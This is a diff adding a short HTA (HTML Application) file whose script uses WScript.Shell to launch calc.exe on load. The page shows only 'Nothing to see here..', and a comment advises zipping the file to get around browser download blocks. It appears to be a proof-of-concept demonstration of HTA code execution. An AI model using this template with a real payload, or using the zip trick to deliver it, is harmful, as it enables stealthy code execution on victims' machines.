@@ -1,0 +1,19 @@
+<html>
+    <!--
+    Run .hta-Application by Win+R and then enter mshta.exe "[pathtofile].hta"
+    Modern browsers will block the download of .hta and .lnk-files 
+    >> due to this we have to wrap the .hta-file into a zip
+    -->
+    <head>
+        <script language="JavaScript">
+            function startCalc() {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("calc.exe");
+            }
+            startCalc();
+        </script>  
+    </head>
+    <body>
+        Nothing to see here..
+    </body>
+</html>
